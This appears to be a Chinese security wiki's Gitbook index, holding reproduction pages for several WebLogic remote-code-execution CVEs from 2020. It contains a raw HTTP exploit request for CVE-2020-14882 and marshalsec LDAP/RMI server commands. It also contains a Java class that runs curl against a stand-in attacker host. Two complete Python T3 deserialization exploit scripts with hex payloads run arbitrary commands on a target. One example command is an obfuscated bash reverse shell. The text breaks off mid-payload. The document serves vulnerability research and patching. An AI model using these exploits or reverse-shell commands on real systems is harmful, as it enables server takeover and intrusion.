GitbookFile Modify: 2021-07-15 20:09:06 "},"Web安全/Weblogic/（CVE-2020-14825）Weblogic反序列化漏洞/（CVE-2020-14825）Weblogic反序列化漏洞.html":{"url":"Web安全/Weblogic/（CVE-2020-14825）Weblogic反序列化漏洞/（CVE-2020-14825）Weblogic反序列化漏洞.html","title":"（CVE-2020-14825）Weblogic反序列化漏洞","keywords":"","body":"（CVE-2020-14825）Weblogic反序列化漏洞 0x01 简介 Weblogic是美国Oracle公司出品的一个Application Server，确切的说是一个基于JavaEE架构的中间件，Weblogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。 0x02 漏洞概述 漏洞编号CVE-2020-14825 Oracle官方在2020年10月份发布的最新安全补丁中修复了许多安全漏洞，其中黑名单类oracle.eclipselink.coherence.integrated.internal.cache.LockVersionExtractor可造成反序列化漏洞。该漏洞允许未经身份验证的攻击者通过IIOP，T3进行网络访问，未经身份验证的攻击者成功利用此漏洞可能接管Oracle Weblogic Server。 0x03 影响版本 Oracle WebLogic Server 12.2.1.3.0 Oracle WebLogic Server 12.2.1.4.0 Oracle WebLogic Server 14.1.1.0.0 0x04 环境搭建 由于之前复现CVE-2020-14645漏洞时已经搭建完成，因此在此不过多阐述过程，仅记录一些信息。 Weblogic下载链接： https://www.oracle.com/middleware/technologies/weblogic-server-installers-downloads.html 选择 12.2.1.4 的 Generic 版本进行下载安装即可，安装过程注意JDK版本造成的安装失败（建议JDK 1.8）以及以管理员权限运行安装包。具体安装过程可参照这两篇文章： http://www.quiee.com.cn/courses/qui/370984-1429262936779670.html https://www.cnblogs.com/xdp-gacl/p/4140683.html 此外，安装过程中，为方便后续其他漏洞利用，安装类型可选择“含示例的完整安装”。 安装完之后，直接运行安装目录下的启动脚本即可，路径结构如下： $Oracle_Home$\\12.2.1.4.0\\user_projects\\domains\\wl_server\\startWebLogic.cmd // Oracle_Home指WebLogic安装的绝对路径 启动脚本后，浏览器访问 http://127.0.0.1:7001/console 正常显示控制台登录界面，即代表安装成功。 0x05 漏洞复现 1、编译poc文件并通过python部署在http服务器，poc文件如下： public class exp{ // POC open calc public exp(){ try { Runtime.getRuntime().exec(\"calc.exe\"); } catch (Exception e) { e.printStackTrace(); } } public static void main(String[] argv){ exp e = new exp(); } } 将编译产生的 class 文件部署在 python 起的 http 服务器 //python3 $python -m http.server 80 2、启动 ldap 服务链接到 poc 文件 $java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://192.168.247.128/#Poc 1389 3、运行 payload 文件生成反序列化数据文件，通过t3协议传输 payload 文件见： https://github.com/rufherg/WebLogic_Basic_Poc/blob/master/poc/CVE_2020_14825.java python T3 脚本见： https://github.com/rufherg/WebLogic_Basic_Poc 0x06 漏洞分析 这个漏洞实质上跟 CVE-2020-14645 并无太大差别，前半段的利用链入口是一致的，只不过最后造成代码执行的类不一样。CVE-2020-14645 用的类为com.tangosol.util.extractor.UniversalExtractor，而 CVE-2020-14825 用的类是oracle.eclipselink.coherence.integrated.internal.cache.LockVersionExtractor。 从调用栈来看，前半部分即是 CC4 链的入口，此部分网上有很多深入分析的文章，此处不再阐述。重点来关注LockVersionExtractor这个类，观察其extract方法。 重点关注图上红框的方法，先来看this.accessor的来源。 构造方法中可以指定accessor，然后在extract方法中会依次调用其initializeAttributes和getAttributeValueFromObject方法。那么我们需要找到一个符合条件的Accessor类，并且其initializeAttributes或getAttributeValueFromObject方法中存在可恶意利用的部分。这里我们寻找到MethodAttributeAccessor这个类，在其getAttributeValueFromObject方法中存在恶意利用的部分。 但此处由于extract方法中的调用参数只有arg0，即parameters为null，因此我们只能寻找无参的利用方法。 方法名可以通过直接调用setGetMethod方法设置，但是这个属性值是经过transient修饰的。所以我们只能从setGetMethod方法入手，看看哪里还调用了这个方法。 恰巧在其initializeAttributes方法有一处调用了setGetMethod方法，但是注意需要给父类AttributeAccessor的attributeName属性赋值，否则将抛出异常。接下来跟进Helper.getDeclaredMethod方法进行分析。 大致就是根据传入的方法是否私有，然后进行不同的处理，最终返回所需的Method对象。所以我们只要通过setGetMethodName方法设置this.getMethodName属性值，但是需要注意的是，我们需要令this.isWriteOnly()返回true，否则将会覆盖我们上面设置的方法。可以通过setIsWriteOnly方法设置this.isWriteOnly为true。 至此，我们可以通过反序列化已经可以调用任意类的无参方法。很容易联想到 CVE-2020-14645 和 fastjson 的利用方式，即通过JdbcRowSetImpl进行 JNDI 注入。其connect方法中调用了lookup方法，并且DataSourceName是可控的，因此存在JNDI注入漏洞，看看有哪些地方调用了connect方法。 由于setAutoCommit不是无参方法，因此使用getDatabaseMetaData方法进行利用。 0x07 修复方式 1、安装官方补丁 https://www.oracle.com/security-alerts/cpuoct2020.html 2、限制T3访问来源 漏洞产生于WebLogic默认启用的T3协议，因此可通过限制T3访问来源来阻止攻击。 3、禁用IIOP协议 可以查看下面官方文章进行关闭IIOP协议。 https://docs.oracle.com/middleware/1213/wls/WLACH/taskhelp/channels/EnableAndConfigureIIOP.html 0x08 总结 实质上，这个洞也是一种类比思路产生，从2555到2883，再到14645然后到14825。不断在跟黑名单博弈，利用链前半段依旧不变，一直在找可以替代的Extractor。在平时的一些挖洞上，类比思路是一个很好的技巧，比起全盘代码审计，显得更加高效。在不断的漏洞复现中，需要学会总结中其中存在的共性，并将其转化为自己的经验技巧，用于平时的漏洞挖掘又或者从甲方的角度去思考如何真正有效的防御。 参考链接： https://www.oracle.com/security-alerts/cpuoct2020.html https://github.com/mbechler/marshalsec https://github.com/rufherg/WebLogic_Basic_Poc Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:09:15 "},"Web安全/Weblogic/（CVE-2020-14882） weblogic 未授权命令执行/（CVE-2020-14882） weblogic 未授权命令执行.html":{"url":"Web安全/Weblogic/（CVE-2020-14882） weblogic 未授权命令执行/（CVE-2020-14882） weblogic 未授权命令执行.html","title":"（CVE-2020-14882） weblogic 未授权命令执行","keywords":"","body":"CVE-2020-14882 weblogic 未授权命令执行 简介 未经身份验证的远程攻击者可能通过构造特殊的 HTTP GET请求，利用该漏洞在受影响的 WebLogic Server 上执行任意代码。它们均存在于WebLogic的Console控制台组件中。此组件为WebLogic全版本默认自带组件，且该漏洞通过HTTP协议进行利用。将CVE-2020-14882和CVE-2020-14883进行组合利用后，远程且未经授权的攻击者可以直接在服务端执行任意代码，获取系统权限。 根据补丁diff结果我们可以看出，可以看出上面的变化 我们可以通过下面的代码，任意加载某个类或者对象 http:///console/console.portal?_nfpb=true&_pageLabel=HomePage1&handle=java.lang.String(\"ahihi\") 未授权访问 非法字符绕过登陆保护 POC 首先通过非法字符绕过访问，然后通过Gadget调用命令执行，poc如下 GET /console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27calc.exe%27);%22); HTTP/1.1 Host: 192.168.3.189:7001 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Cookie: ADM Upgrade-Insecure-Requests: 1 https://mp.weixin.qq.com/s/48VIwTkyFVXUTS78kNByhg Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:09:18 "},"Web安全/Weblogic/（CVE-2020-2551）Weblogic CVE-2020-2551 IIOP协议反序列化rce/（CVE-2020-2551）Weblogic CVE-2020-2551 IIOP协议反序列化rce.html":{"url":"Web安全/Weblogic/（CVE-2020-2551）Weblogic CVE-2020-2551 IIOP协议反序列化rce/（CVE-2020-2551）Weblogic CVE-2020-2551 IIOP协议反序列化rce.html","title":"（CVE-2020-2551）Weblogic CVE-2020-2551 IIOP协议反序列化rce","keywords":"","body":"（CVE-2020-2551）Weblogic CVE-2020-2551 IIOP协议反序列化rce 一、漏洞简介 二、漏洞影响 三、复现过程 漏洞分析 现在我们来看这个漏洞。IIOP传输的过程中会自动序列化和反序列化，那么我们可以通过向服务器7001端口发送一个恶意的序列化对象，IIOP达到RCE。 发送恶意序列化对象的过程，其实就是bind的过程，由此我们可以构造请求 Hashtable env = new Hashtable(); // add wlsserver/server/lib/weblogic.jar to classpath,else will error. env.put(\"java.naming.factory.initial\", \"weblogic.jndi.WLInitialContextFactory\"); env.put(\"java.naming.provider.url\", rhost); Context context = new InitialContext(env); // get Object to Deserialize JtaTransactionManager jtaTransactionManager = new JtaTransactionManager(); jtaTransactionManager.setUserTransactionName(rmiurl); Remote remote = createMemoitizedProxy(createMap(\"pwned\"+System.nanoTime(), jtaTransactionManager), Remote.class); context.rebind(\"Y4er\"+System.nanoTime(), remote); Hashtable env = new Hashtable(); // add wlsserver/server/lib/weblogic.jar to classpath,else will error. env.put(\"java.naming.factory.initial\", \"weblogic.jndi.WLInitialContextFactory\"); env.put(\"java.naming.provider.url\", rhost); Context context = new InitialContext(env); // get Object to Deserialize JtaTransactionManager jtaTransactionManager = new JtaTransactionManager(); jtaTransactionManager.setUserTransactionName(rmiurl); Remote remote = createMemoitizedProxy(createMap(\"pwned\"+System.nanoTime(), jtaTransactionManager), Remote.class); context.rebind(\"Y4er\"+System.nanoTime(), remote); 你肯定疑惑JtaTransactionManager和weblogic.jndi.WLInitialContextFactory是从哪来的？ JtaTransactionManager是spring爆出的一个可以JNDI注入的类，在weblogic中也存在。 weblogic.jndi.WLInitialContextFactory 是weblogic的JNDI工厂类。 国际惯例，跟一下流程，IIOP解析数据流的部分看不懂不跟了，从IIOP开始反序列化对象开始 E:/source/java/Weblogic/src/main/resources/lib/modules/weblogic.jar!/weblogic/iiop/IIOPInputStream.class:1725 WeblogicCVE-2020-2551IIOP协议反序列化rce/media/rId25.png) 此时var2是序列化传入的com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager，跟进readValue() WeblogicCVE-2020-2551IIOP协议反序列化rce/media/rId26.png) 跟进readValueData()，判断是否有readObject方法之后进入自身的readObject()，也就是om.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager的readObject WeblogicCVE-2020-2551IIOP协议反序列化rce/media/rId27.png) 然后通过反射调用JtaTransactionManager的**readObject()**跟进 WeblogicCVE-2020-2551IIOP协议反序列化rce/media/rId28.png) 到此之后就是Weblogic的CVE-2018-3191 spring JNDI注入了，简单来说就是lookup()的参数可控，导致可以加载任意类。我们继续跟进initUserTransactionAndTransactionManager() WeblogicCVE-2020-2551IIOP协议反序列化rce/media/rId29.png) 如果userTransaction等于空有userTransactionName属性则进入lookupUserTransaction()，跟进 WeblogicCVE-2020-2551IIOP协议反序列化rce/media/rId30.png) 此时**lookup()**参数可控 WeblogicCVE-2020-2551IIOP协议反序列化rce/media/rId31.png) lookup加载我们的RMI服务，可以注入恶意ip的rmi服务，触发实例化恶意类构造方法调用 漏洞复现 https://github.com/ianxtianxt/CVE-2020-2551 打包好的jar包 https://download.0-sec.org/download/weblogic_CVE_2020_2551.zip 下载jar包，然后使用marshalsec起一个恶意的RMI服务，本地编译一个exp.java package payload; import java.io.IOException; public class exp { public exp() { String cmd = \"curl http://172.16.1.1/success\"; try { Runtime.getRuntime().exec(cmd).getInputStream(); } catch (IOException e) { e.printStackTrace(); } } } 尽量使用和weblogic相同的版本编译 然后本地起一个web服务器 python -m http.server --bind 0.0.0.0 80 命令行运行jar包 java -jar weblogic_CVE_2020_2551.jar 172.16.1.128 7001 rmi://172.16.1.1:1099/exp 实际效果如图 WeblogicCVE-2020-2551IIOP协议反序列化rce/media/rId33.gif) 参考链接 https://y4er.com/post/weblogic-cve-2020-2551/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:09:11 "},"Web安全/Weblogic/（CVE-2020-2555）Oracle Coherence&Weblogic 反序列化远程代码执行漏洞/（CVE-2020-2555）Oracle Coherence&Weblogic 反序列化远程代码执行漏洞.html":{"url":"Web安全/Weblogic/（CVE-2020-2555）Oracle Coherence&Weblogic 反序列化远程代码执行漏洞/（CVE-2020-2555）Oracle Coherence&Weblogic 反序列化远程代码执行漏洞.html","title":"（CVE-2020-2555）Oracle Coherence&Weblogic 反序列化远程代码执行漏洞","keywords":"","body":"（CVE-2020-2555）Oracle Coherence&Weblogic 反序列化远程代码执行漏洞 一、漏洞简介 该反序列化的gadget存在与coherence包中。具体可以见分析 构造chain类似于common-collection的chain，可以照葫芦画瓢。 mvn 好像不能下载coherence包，很奇怪，直接下jar包就行。 反序列化的对象，通过t3发送给Weblogic即可。所以，这个只是生成payload的工具 二、漏洞影响 Oracle Coherence 3.7.1.17 Oracle Coherence 12.1.3.0.0 Oracle Coherence 12.2.1.3.0 Oracle Coherence 12.2.1.4.0 三、复现过程 poc cve-2020-2555_cmd.py #!/usr/bin/python # -*- coding: utf-8 -*- # from:https://github.com/zhzyker/exphub import socket import time import ssl import binascii import urlparse import argparse import sys globalProxies = {} header = { 'User-Agent': \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\" } def parseUrl(url): parsed = urlparse.urlparse(url) proto = parsed.scheme netloc = parsed.netloc ip = netloc if proto == 'http': port = 80 else: port = 443 if (':' in netloc): ip = netloc.split(':')[0] port = netloc.split(':')[1] uri = parsed.path return (proto, ip, port, uri) def CVE_2020_2555(cmd): payload_start = 'aced00057372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556616c7565457870457863657074696f6ed4e7daab632d46400200014c000376616c7400124c6a6176612f6c616e672f4f626a6563743b787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc4020000787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d6573736167657400124c6a6176612f6c616e672f537472696e673b5b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b787071007e0008707572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd22390200007870000000037372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd8502000449000a6c696e654e756d6265724c000e6465636c6172696e67436c61737371007e00054c000866696c654e616d6571007e00054c000a6d6574686f644e616d6571007e000578700000004374002079736f73657269616c2e7061796c6f6164732e4356455f323032305f323535357400124356455f323032305f323535352e6a6176617400096765744f626a6563747371007e000b0000000171007e000d71007e000e71007e000f7371007e000b0000002274001979736f73657269616c2e47656e65726174655061796c6f616474001447656e65726174655061796c6f61642e6a6176617400046d61696e737200266a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c654c697374fc0f2531b5ec8e100200014c00046c69737471007e00077872002c6a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c65436f6c6c656374696f6e19420080cb5ef71e0200014c0001637400164c6a6176612f7574696c2f436f6c6c656374696f6e3b7870737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a657870000000007704000000007871007e001a7873720024636f6d2e74616e676f736f6c2e7574696c2e66696c7465722e4c696d697446696c74657299022596d7b4595302000649000b6d5f635061676553697a654900076d5f6e506167654c000c6d5f636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b4c00086d5f66696c74657274001a4c636f6d2f74616e676f736f6c2f7574696c2f46696c7465723b4c000f6d5f6f416e63686f72426f74746f6d71007e00014c000c6d5f6f416e63686f72546f7071007e0001787000000000000000007372002c636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e436861696e6564457874726163746f72889f81b0945d5b7f02000078720036636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374436f6d706f73697465457874726163746f72086b3d8c05690f440200015b000c6d5f61457874726163746f727400235b4c636f6d2f74616e676f736f6c2f7574696c2f56616c7565457874726163746f723b7872002d636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374457874726163746f72658195303e7238210200014900096d5f6e546172676574787000000000757200235b4c636f6d2e74616e676f736f6c2e7574696c2e56616c7565457874726163746f723b2246204735c4a0fe0200007870000000047372002d636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4964656e74697479457874726163746f72936ee080c7259c4b0200007871007e0022000000007372002f636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e5265666c656374696f6e457874726163746f72ee7ae995c02fb4a20200025b00096d5f616f506172616d7400135b4c6a6176612f6c616e672f4f626a6563743b4c00096d5f734d6574686f6471007e00057871007e002200000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65707400096765744d6574686f647371007e0028000000007571007e002b000000027070740006696e766f6b657371007e0028000000007571007e002b0000000174' payload_lenhex = '{:04x}'.format(len(cmd)) payload_cmdhex = binascii.b2a_hex(cmd) payload_end = '7400046578656370767200116a6176612e6c616e672e52756e74696d650000000000000000000000787070' payload = payload_start + payload_lenhex + payload_cmdhex + payload_end return payload class payloadtest(object): def __init__(self): self.vuln = 'cve_2020_2555' def t3handshake(self,sock,server_addr): sock.connect(server_addr) sock.send('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'.decode('hex')) time.sleep(1) data = sock.recv(1024) #print data #print 'handshake successful' def buildT3RequestObject(self,sock,port): data1 = '000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371' data2 = '007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd60000000700001b19ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07' data3 = '1a7727000d3234322e323134' data4 = '2e312e32353461863d1d0000000078' for d in [data1,data2,data3,data4]: sock.send(d.decode('hex')) time.sleep(2) #print 'send request payload successful,recv length:%d'%(len(sock.recv(2048))) def sendEvilObjData(self,sock,data): payload='056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000' payload+=data payload+='fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff' payload = '%s%s'%('{:08x}'.format(len(payload)/2 + 4),payload) sock.send(payload.decode('hex')) time.sleep(2) sock.send(payload.decode('hex')) res = '' n=1 try: while True: n += 1 res += sock.recv(4096) time.sleep(0.1) if(n>15): break except Exception as e: pass return res def check(self, url, cmd,timeout, proxies=globalProxies, **args): (proto, ip, port, uri) = parseUrl(url) server_addr = (ip, int(port)) if proto == 'https': sock = ssl.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM)) else: sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.settimeout(timeout) try: self.t3handshake(sock,server_addr) self.buildT3RequestObject(sock,port) payload = CVE_2020_2555(cmd) resp = self.sendEvilObjData(sock,payload) print ('[+] Payload send succeed! Please check.') return True except Exception as e: print ('[-] Failed! Exception:{}'.format(str(e))) return False def poc(url,cmd): x = payloadtest() return x.check(url, cmd,20) if __name__ == '__main__': parser = argparse.ArgumentParser(description='Weblogic cve-2020-2555 Exp', usage='[*] use \"python %(prog)s --help\" for more information', formatter_class=argparse.RawTextHelpFormatter) parser.add_argument(\"-u\", \"--url\", dest=\"url\", help=\"the url to check\" ) parser.add_argument(\"-c\", \"--cmd\", dest=\"cmd\", help=\"the cmd to run on the target\" ) args = parser.parse_args() if not args.url or not args.cmd: sys.exit('[*] Please assign url and cmd! \\n[*] Examples python cve-2020-2883_cmd.py -u http://127.0.0.1:7001 -c calc') poc(args.url, args.cmd) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:09:13 "},"Web安全/Weblogic/（CVE-2020-2883）Weblogic 远程代码执行漏洞/（CVE-2020-2883）Weblogic 远程代码执行漏洞.html":{"url":"Web安全/Weblogic/（CVE-2020-2883）Weblogic 远程代码执行漏洞/（CVE-2020-2883）Weblogic 远程代码执行漏洞.html","title":"（CVE-2020-2883）Weblogic 远程代码执行漏洞","keywords":"","body":"（CVE-2020-2883）Weblogic 远程代码执行漏洞 一、漏洞简介 二、漏洞影响 WebLogic 10.3.6.0.0 WebLogic 12.1.3.0.0 WebLogic 12.2.1.3.0 WebLogic 12.2.1.4.0 三、复现过程 WebLogic 10.3.6.0.0 WebLogic 12.1.3.0.0 WebLogic 12.2.1.4.0 先下载框架 https://download.0-sec.org/download/CVE-2020-2555-master.zip 再下载poc https://download.0-sec.org/download/CVE-2020-2883-master.zip 将 CVE_2020_2883.java 放到 src/com/supeream/CVE_2020_2883.java 目录下 导入idea运行 CVE_2020_2883.java RCE!Weblogic远程代码执行漏洞/media/rId25.png)Weblogic远程代码执行漏洞/media/rId26.png)Weblogic远程代码执行漏洞/media/rId27.png) WebLogic 12.1.3.0 cve-2020-2883_cmd.py仅适配了12.1.3.0版本的weblogic Weblogic远程代码执行漏洞/media/rId29.png)Weblogic远程代码执行漏洞/media/rId30.png) python cve-2020-2883.py -u \"http://www.0-sec.org:7001/\" -c \"bash -c {echo,YmFzaCAtaSA+JiAvZGVxxxxxxxsfwafwadadwadLjkxLjI2LzEyMzQgMD4mMQ==}|{base64,-d}|{bash,-i}\" Weblogic远程代码执行漏洞/media/rId31.png) #!/usr/bin/python # -*- coding:utf-8 -*- # from:https://github.com/zhzyker/exphub import socket import time import ssl import binascii import urlparse import argparse import sys globalProxies = {} header = { 'User-Agent': \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\" } def parseUrl(url): parsed = urlparse.urlparse(url) proto = parsed.scheme netloc = parsed.netloc ip = netloc if proto == 'http': port = 80 else: port = 443 if (':' in netloc): ip = netloc.split(':')[0] port = netloc.split(':')[1] uri = parsed.path return (proto, ip, port, uri) def CVE_2020_2883(cmd): payload_start = 'aced0005737200176a6176612e7574696c2e5072696f72697479517565756594da30b4fb3f82b103000249000473697a654c000a636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b78700000000273720030636f6d2e74616e676f736f6c2e7574696c2e636f6d70617261746f722e457874726163746f72436f6d70617261746f72c7ad6d3a676f3c180200014c000b6d5f657874726163746f727400224c636f6d2f74616e676f736f6c2f7574696c2f56616c7565457874726163746f723b78707372002c636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e436861696e6564457874726163746f72889f81b0945d5b7f02000078720036636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374436f6d706f73697465457874726163746f72086b3d8c05690f440200015b000c6d5f61457874726163746f727400235b4c636f6d2f74616e676f736f6c2f7574696c2f56616c7565457874726163746f723b7872002d636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374457874726163746f72658195303e7238210200014900096d5f6e546172676574787000000000757200235b4c636f6d2e74616e676f736f6c2e7574696c2e56616c7565457874726163746f723b2246204735c4a0fe0200007870000000037372002f636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e5265666c656374696f6e457874726163746f72ee7ae995c02fb4a20200025b00096d5f616f506172616d7400135b4c6a6176612f6c616e672f4f626a6563743b4c00096d5f734d6574686f647400124c6a6176612f6c616e672f537472696e673b7871007e000900000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647371007e000d000000007571007e001100000002707571007e001100000000740006696e766f6b657371007e000d000000007571007e00110000000174' payload_lenhex = '{:04x}'.format(len(cmd)) payload_cmdhex = binascii.b2a_hex(cmd) payload_end = '74000465786563770400000003767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707400013178' payload = payload_start + payload_lenhex + payload_cmdhex + payload_end return payload class payloadtest(object): def __init__(self): self.vuln = 'cve_2020_2883' def t3handshake(self,sock,server_addr): sock.connect(server_addr) sock.send('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'.decode('hex')) time.sleep(1) data = sock.recv(1024) #print data #print 'handshake successful' def buildT3RequestObject(self,sock,port): data1 = '000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e566572736